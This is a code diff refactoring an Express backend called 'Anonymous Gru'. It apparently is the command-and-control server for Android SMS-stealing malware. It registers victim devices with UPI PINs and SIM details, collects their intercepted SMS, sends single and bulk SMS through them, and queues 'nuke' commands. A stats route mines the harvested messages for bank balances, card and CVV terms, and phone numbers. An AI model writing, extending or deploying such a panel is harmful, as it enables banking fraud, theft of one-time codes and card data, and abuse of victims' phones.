@@ -17,7 +17,7 @@ if (!fs.existsSync(DATA_DIR)) {
   fs.mkdirSync(DATA_DIR, { recursive: true });
 }
 
-// Initialize JSON files if they don't exist
+// Initialize JSON files
 const initFile = (file, defaultData) => {
   if (!fs.existsSync(file)) {
     fs.writeFileSync(file, JSON.stringify(defaultData, null, 2));
@@ -28,7 +28,7 @@ initFile(MESSAGES_FILE, {});
 initFile(OUTBOX_FILE, {});
 initFile(NUKE_JOBS_FILE, {});
 
-// Helper: read/write JSON
+// Helpers
 const readJSON = (file) => {
   try {
     return JSON.parse(fs.readFileSync(file, 'utf8'));
@@ -44,15 +44,43 @@ const writeJSON = (file, data) => {
 app.use(cors());
 app.use(express.json({ limit: '10mb' }));
 
-// -------- DEVICE ENDPOINTS --------
+// -------- STATIC FILES (optional) --------
+// If you put your frontend files (index.html, static/css, etc.) in a 'public' folder,
+// uncomment the line below to serve them.
+// app.use(express.static(path.join(__dirname, 'public')));
 
-// List all devices
+// -------- ROOT ROUTE --------
+app.get('/', (req, res) => {
+  res.json({
+    name: 'Anonymous Gru Backend API',
+    version: '1.0.0',
+    status: 'running',
+    endpoints: {
+      devices: '/api/devices',
+      device: '/api/devices/:id',
+      messages: '/api/messages/:deviceId',
+      sendSms: '/api/sms/send',
+      bulkSms: '/api/sms/bulk',
+      outbox: '/api/sms/outbox/:deviceId',
+      nuke: '/api/nuke',
+      nukeStatus: '/api/nuke/status/:deviceId',
+      stats: '/api/stats',
+      health: '/api/health'
+    }
+  });
+});
+
+// -------- HEALTH CHECK --------
+app.get('/api/health', (req, res) => {
+  res.json({ status: 'ok', timestamp: Date.now() });
+});
+
+// -------- DEVICE ENDPOINTS --------
 app.get('/api/devices', (req, res) => {
   const devices = readJSON(DEVICES_FILE);
   res.json(devices);
 });
 
-// Get single device
 app.get('/api/devices/:id', (req, res) => {
   const devices = readJSON(DEVICES_FILE);
   const device = devices[req.params.id];
@@ -62,7 +90,6 @@ app.get('/api/devices/:id', (req, res) => {
   res.json(device);
 });
 
-// Register or update a device
 app.post('/api/devices', (req, res) => {
   const { id, name, status, battery, android, ip, storage, provider, cpu, sdk, sims, upipin, modelName, phoneNumber, lastSeen } = req.body;
   if (!id) {
@@ -72,7 +99,6 @@ app.post('/api/devices', (req, res) => {
   const devices = readJSON(DEVICES_FILE);
   const existing = devices[id] || {};
 
-  // Merge with new data
   devices[id] = {
     ...existing,
     id,
@@ -97,7 +123,6 @@ app.post('/api/devices', (req, res) => {
   res.json({ success: true, device: devices[id] });
 });
 
-// Delete device
 app.delete('/api/devices/:id', (req, res) => {
   const devices = readJSON(DEVICES_FILE);
   if (!devices[req.params.id]) {
@@ -108,9 +133,7 @@ app.delete('/api/devices/:id', (req, res) => {
   res.json({ success: true });
 });
 
-// -------- MESSAGES (SMS) ENDPOINTS --------
-
-// Get messages for a device (last 150)
+// -------- MESSAGES --------
 app.get('/api/messages/:deviceId', (req, res) => {
   const { deviceId } = req.params;
   const limit = parseInt(req.query.limit) || 150;
@@ -121,7 +144,6 @@ app.get('/api/messages/:deviceId', (req, res) => {
   res.json(latest);
 });
 
-// Add a new message (SMS) for a device
 app.post('/api/messages/:deviceId', (req, res) => {
   const { deviceId } = req.params;
   const { sender, message, dateTime, type } = req.body;
@@ -136,7 +158,7 @@ app.post('/api/messages/:deviceId', (req, res) => {
 
   const entry = {
     sender: sender || 'Unknown',
-    message: message,
+    message,
     dateTime: dateTime || new Date().toISOString(),
     timestamp: Date.now(),
     type: type || 'incoming'
@@ -147,9 +169,7 @@ app.post('/api/messages/:deviceId', (req, res) => {
   res.json({ success: true, entry });
 });
 
-// -------- OUTBOX (Sent SMS) --------
-
-// Send SMS (single)
+// -------- SMS SEND --------
 app.post('/api/sms/send', (req, res) => {
   const { deviceId, to, message, simSlot } = req.body;
   if (!deviceId || !to || !message) {
@@ -174,7 +194,7 @@ app.post('/api/sms/send', (req, res) => {
   outbox[deviceId].push(entry);
   writeJSON(OUTBOX_FILE, outbox);
 
-  // Also store in device-specific messages as "outgoing"
+  // Also store in messages as outgoing
   const messages = readJSON(MESSAGES_FILE);
   if (!messages[deviceId]) {
     messages[deviceId] = [];
@@ -188,7 +208,7 @@ app.post('/api/sms/send', (req, res) => {
   });
   writeJSON(MESSAGES_FILE, messages);
 
-  // Simulate sending (mark as sent after 2s)
+  // Simulate delivery after 2s
   setTimeout(() => {
     const updated = readJSON(OUTBOX_FILE);
     if (updated[deviceId]) {
@@ -203,7 +223,6 @@ app.post('/api/sms/send', (req, res) => {
   res.json({ success: true, entry });
 });
 
-// Bulk SMS
 app.post('/api/sms/bulk', (req, res) => {
   const { deviceId, recipients, message, simSlot } = req.body;
   if (!deviceId || !recipients || !Array.isArray(recipients) || recipients.length === 0) {
@@ -264,16 +283,13 @@ app.post('/api/sms/bulk', (req, res) => {
   res.json({ success: true, count: entries.length, entries });
 });
 
-// Get outbox for a device
 app.get('/api/sms/outbox/:deviceId', (req, res) => {
   const outbox = readJSON(OUTBOX_FILE);
   const deviceOutbox = outbox[req.params.deviceId] || [];
   res.json(deviceOutbox.sort((a, b) => b.timestamp - a.timestamp));
 });
 
-// -------- NUKE COMMANDS --------
-
-// Trigger nuke for a device
+// -------- NUKE --------
 app.post('/api/nuke', (req, res) => {
   const { deviceId, command, data } = req.body;
   if (!deviceId) {
@@ -305,15 +321,13 @@ app.post('/api/nuke', (req, res) => {
   res.json({ success: true, jobId });
 });
 
-// Get nuke status for a device
 app.get('/api/nuke/status/:deviceId', (req, res) => {
   const nukeJobs = readJSON(NUKE_JOBS_FILE);
   const job = nukeJobs[req.params.deviceId] || null;
   res.json(job);
 });
 
-// -------- STATISTICS --------
-
+// -------- STATS --------
 app.get('/api/stats', (req, res) => {
   const devices = readJSON(DEVICES_FILE);
   const deviceList = Object.values(devices);
@@ -321,32 +335,20 @@ app.get('/api/stats', (req, res) => {
   const online = deviceList.filter(d => d.status === true).length;
   const offline = total - online;
 
-  // Count devices with bank SMS (from messages)
   const messages = readJSON(MESSAGES_FILE);
-  let bankCount = 0;
-  let cardCount = 0;
-  const phoneNumbers = new Set();
-  const networks = new Set();
+  let bankCount = 0, cardCount = 0;
+  const phoneNumbers = new Set(), networks = new Set();
 
   Object.keys(messages).forEach(deviceId => {
     const msgs = messages[deviceId] || [];
     msgs.forEach(msg => {
       const text = msg.message || '';
-      // Simple detection: bank balance keywords
-      if (/balance|avail|credited|debited|₹|INR/i.test(text)) {
-        bankCount++;
-      }
-      // Card detection
-      if (/card|cvv|expiry|credit|debit/i.test(text)) {
-        cardCount++;
-      }
-      // Phone numbers
+      if (/balance|avail|credited|debited|₹|INR/i.test(text)) bankCount++;
+      if (/card|cvv|expiry|credit|debit/i.test(text)) cardCount++;
       const phoneMatch = text.match(/(?:\+91|0)?[6-9]\d{9}/);
       if (phoneMatch) phoneNumbers.add(phoneMatch[0]);
-      // Network detection
-      if (/jio|airtel|bsnl|vodafone|idea|vi|docomo|reliance/i.test(text)) {
-        networks.add(text.match(/jio|airtel|bsnl|vodafone|idea|vi|docomo|reliance/i)[0]);
-      }
+      const netMatch = text.match(/jio|airtel|bsnl|vodafone|idea|vi|docomo|reliance/i);
+      if (netMatch) networks.add(netMatch[0]);
     });
   });
 
@@ -361,11 +363,23 @@ app.get('/api/stats', (req, res) => {
   });
 });
 
-// -------- FALLBACK FOR FRONTEND ROUTES --------
-app.get('*', (req, res) => {
-  res.status(404).json({ error: 'API endpoint not found' });
+// -------- CATCH-ALL FOR UNKNOWN API ROUTES --------
+app.use('/api/*', (req, res) => {
+  res.status(404).json({ error: `API endpoint not found: ${req.originalUrl}` });
+});
+
+// -------- FALLBACK FOR NON-API ROUTES (optional) --------
+// If you want to serve a frontend single-page app, uncomment below.
+// app.get('*', (req, res) => {
+//   res.sendFile(path.join(__dirname, 'public', 'index.html'));
+// });
+
+// For now, we just return a 404 for any non-API route (except root which is defined).
+app.use((req, res) => {
+  res.status(404).json({ error: 'Route not found' });
 });
 
 app.listen(PORT, () => {
   console.log(`✅ Anonymous Gru backend running on port ${PORT}`);
+  console.log(`📍 Visit http://localhost:${PORT} for API info`);
 });
